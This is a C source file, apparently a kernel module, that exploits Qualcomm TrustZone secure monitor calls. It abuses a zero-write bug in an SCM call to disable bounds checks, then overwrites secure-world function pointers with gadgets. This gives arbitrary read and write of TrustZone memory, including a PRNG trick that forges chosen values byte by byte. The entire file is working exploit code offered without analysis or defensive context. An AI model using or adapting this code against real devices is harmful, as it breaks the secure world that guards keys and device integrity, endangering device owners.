#include "exploit.h"


/**
* @brief write_range - Write a buffer of DWORDs starting at address
*
* @param uint32_t* data - The data to write. Must be 4 byte aligned
* @param size_t - The amount of data contained in the buffer
* @param uint32_t - The start address to write to
*
* @return int
*/
int write_range(uint32_t* data, size_t size, uint32_t address)
{
    int i;

    if ((size % sizeof(uint32_t)) != 0) {
        logd("[-] Data buffer must by 4-byte aligned\n");
        return 1;
    }
    
    for (i = 0; i < (size/sizeof(uint32_t)); i++) {
        write_dword_fast((address+(i * sizeof(uint32_t))), data[i]);
    }

    return 0;
}

/**
* @brief read_range - Read a range of DWORD's into an allocated buffer
*
* @param uint32_t - The start address to read from. Must be 4 byte aligned
* @param size_t - The amount of data to read. Must be 4 byte aligned
* @param uint32_t* buffer - The buffer to store the data in
*
* @return int
*/
int read_range(uint32_t address, size_t size, uint32_t* buffer, bool dump)
{
    int i;
    if ((size % sizeof(uint32_t)) != 0) {
        logd("[-] The amount of data to read must by 4-byte aligned\n");
        return 1;
    }

    for (i = 0; i < (size/sizeof(uint32_t)); i++) {
        buffer[i] = read_dword_fast((address+(i * sizeof(uint32_t))));
    }

    if (dump) {
        print_hex_dump(KERN_DEBUG, __func__, DUMP_PREFIX_ADDRESS, 16, 1, (uint8_t*)buffer, size, true);
    }

    return 0;
}


/**
* @brief read_dword - Read DWORD from address
*
* @param uint32_t address
*
* @return uint32_t 
*/
uint32_t read_dword(uint32_t address)
{
    uint32_t* data;
    flush_cache_all();     
    data = phys_to_virt(address);
    return (uint32_t)*data;
}

/**
* @brief disable_bounds_checks - Disables bound checks on SCM call addresses allowing for pointers to secure memory
*
* @return int
*/
int disable_bounds_checks(void)
{
    int32_t addr     = BOUNDS_CHECKS_RANGE_START;
    int32_t end_addr = BOUNDS_CHECKS_RANGE_END + 1;
    
    zero_dword(BOUNDS_CHECK_DWORD_ADDRESS);

    while (addr <= end_addr) {        
        zero_dword(addr);
        addr += 4;
    }

    return 0;
}

/**
* @brief fver_get_version - Run fver_get_version SCM call.
*
* @param uint32_t version_code
*
* @return uint32_t
*/
uint32_t fver_get_version(uint32_t version_code)
{
    scm_call_atomic3(TZ_SVC_INFO, TZ_SVC_INFO_GET_VERSION, version_code, JUNK_PHYSICAL_ADDRESS, 4);
    return read_dword(JUNK_PHYSICAL_ADDRESS);
}


/**
* @brief zero_dword - Zero out a DWORD using zero write pimitive exploit in TZ_SVC_ES_IS_ACTIVATED SCM call
*
* @param uint32_t address - The DWORD address to zero out
*
* @return int
*/
int zero_dword(uint32_t address)
{
    return scm_call_atomic2(TZ_SVC_ES, TZ_SVC_ES_IS_ACTIVATED, address, 0x00);
}

/**
* @brief write_random_value - Write a value of n length to address using PRNG
*
* @param uint32_t address - The address to write the value to
* @param size_t length - The size of the value to generate
*
* @return int
*/
int write_random_value(uint32_t address, size_t length)
{   
    if (length >= MAX_RANDOM_LEN) {
        return 1;
    }

    return scm_call_atomic2(TZ_SVC_CRYPTO, TZ_SVC_CRYPTO_PRNG_GET_DATA, address, length);
}

/**
* @brief write_dword_fast - After overwriting the TZ_SVC_INFO_GET_DIAG function pointer with write gadget, write DWORD to address
*
* @param uint32_t address - Address to write to
* @param uint32_t dword - DWORD to write
*
* @return int
*/
int write_dword_fast(uint32_t address, uint32_t dword)
{
    return scm_call_atomic2(TZ_SVC_INFO, TZ_SVC_INFO_GET_DIAG, dword, address);
}

/**
* @brief read_dword_fast - After overwriting the TZ_SVC_DUMP_SECURITY_ALLOWS_MEM_DUMP function pointer with read gadget, read DWORD from address
*                           and copy it to our junk physical address for reading
*
* @param uint32_t address - Address to read DWORD from
*
* @return uint32_t - The DWORD at address specified
*/
uint32_t read_dword_fast(uint32_t address)
{
    scm_call_atomic2(TZ_SVC_DUMP, TZ_SVC_DUMP_SECURITY_ALLOWS_MEM_DUMP, JUNK_PHYSICAL_ADDRESS, address);
    return read_dword(JUNK_PHYSICAL_ADDRESS);
}


/**
* @brief write_dword_slow - Using PRNG after disabling bounds checks, generate a wanted DWORD one byte at a time and write it to
*                           the specified address.
*
* @param uint32_t address - Address to write the final DWORD to
* @param uint32_t dword - The DWORD we want to generate
*
* @return int
*/
int write_dword_slow(uint32_t address, uint32_t dword)
{
    int i;
    uint32_t current_dword      = fver_get_version(0);
    uint8_t* current_dword_ptr  = (uint8_t*)&current_dword;
    uint8_t* wanted_dword_ptr   = (uint8_t*)&dword;
    
    if (current_dword != dword) {
        for (i = 0; i < sizeof(dword); i++) {
            while (current_dword_ptr[i] != wanted_dword_ptr[i]) {
                write_random_value((VERSION_CODE_0_DWORD_ADDRESS + i), 1);
                current_dword = fver_get_version(0);
            }
            logd("[+] Got expected byte %02X (%02X) for position %d\n", current_dword_ptr[i], wanted_dword_ptr[i], i);
        }
    }
    logd("[+] Got expected DWORD %08X (%08X) - \n", current_dword, dword);
    return scm_call_atomic3(TZ_SVC_INFO, TZ_SVC_INFO_GET_VERSION, 0, address, 4);
}